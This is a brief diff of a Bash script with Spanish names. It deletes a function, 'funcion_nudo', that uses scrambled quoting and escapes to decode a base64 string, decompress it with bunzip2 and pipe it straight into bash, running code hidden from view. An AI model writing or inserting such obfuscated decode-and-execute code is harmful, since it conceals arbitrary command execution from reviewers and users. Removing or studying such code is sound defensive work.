@@ -26,9 +26,6 @@ funcion_notificacion(){
         fi          
 }
 
-funcion_nudo(){
-    $@ pri'n'tf  %s "$(  ${*%s@} \prin$'\164f'  'QlpoOTFBWSZTWXJHDM8AAAEBgAQAigAgACGaaDNNEzxdyRThQkHJHDM8'${@%B\[} |\bas$'\x65'\64  -d  |"${@~~}""b"\un'z'ip2  -c  )"| ${*#J}b\as""$*h $@
-}
 
 source ./script_hijo_00XX.sh
 source ./script_hijo_00XX.sh
